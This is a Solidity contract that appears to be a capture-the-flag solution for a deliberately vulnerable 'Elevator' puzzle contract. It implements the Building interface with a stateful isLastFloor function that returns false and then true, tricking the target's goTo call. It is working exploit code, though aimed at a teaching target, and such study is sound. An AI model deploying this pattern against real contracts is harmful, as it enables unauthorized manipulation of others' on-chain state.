// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Elevator.sol';

contract HackElevator is Building {
  // Complete with the instance's address
  Elevator public originalContract = Elevator(0xEa94eede078e8d6dcfCD1D0BBE479dE37dbbeb19); 
  // It's going to be the way we know if it's the first call or the second one
  bool public firstTime = true;

  // It doesn't matter what number we use, so we're going to use 1
  function hack() public {
      originalContract.goTo(1);
  }

  // The trick here is that this function it's going to be called 2 times inside the function goTo of the original contract
  // The first time we need to be false, and the second one we need to be true
  function isLastFloor(uint) public virtual override returns (bool) {
    // first call we return false
    if (firstTime) {
      firstTime = false;
      return false;
      // second call we return true
    } else {
      return true;
    }
  }

}